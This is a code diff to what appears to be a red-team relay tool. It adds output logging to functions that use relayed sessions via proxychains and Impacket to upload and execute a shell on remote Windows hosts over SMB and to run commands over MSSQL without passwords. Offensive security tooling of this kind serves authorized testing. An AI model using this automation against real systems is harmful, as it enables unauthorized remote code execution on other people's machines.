@@ -109,6 +109,8 @@ def smb_shell(relay_user, relay_host, relay_port, shell_path):
         proc = run(['proxychains', 'smbclient.py', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
             input=input, encoding='ascii')
         print(proc.stdout)
+        with open(f'smb_shell.{relay_user.replace("/", ".")}.{relay_host}.txt', 'a') as file:
+            file.write(f'{proc.stdout}')
     except Exception as error:
         print(f"Error: '{error}' uploading C:\\Users\\Public\\{shell_path} as '{connection_string}'.")
     print(f"Attempting to smbexec C:\\Users\\Public\\{shell_path} as '{connection_string}'.")
@@ -116,6 +118,8 @@ def smb_shell(relay_user, relay_host, relay_port, shell_path):
         proc2 = run(['proxychains', 'smbexec.py', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
             input=f'C:\\Users\\Public\\{shell_path}\nexit\n', encoding='ascii')
         print(proc2.stdout)
+        with open(f'smb_shell.{relay_user.replace("/", ".")}.{relay_host}.txt', 'a') as file:
+            file.write(f'{proc2.stdout}')
     except Exception as error:
         print(f"Error: '{error}' running smbexec as '{connection_string}'.")
 
@@ -147,6 +151,8 @@ def mssql_exec(relay_user, relay_host, relay_port, method, command):
     try:
         proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string], stdout=PIPE,
             input=input, encoding='ascii')
+        with open(f'mssql_exec.{relay_user.replace("/", ".")}.{relay_host}.txt', 'a') as file:
+            file.write(f'{proc.stdout}')
         print(proc.stdout)
     except Exception as error:
         print(f"Error: '{error}' executing command '{command}' as '{connection_string}'.")
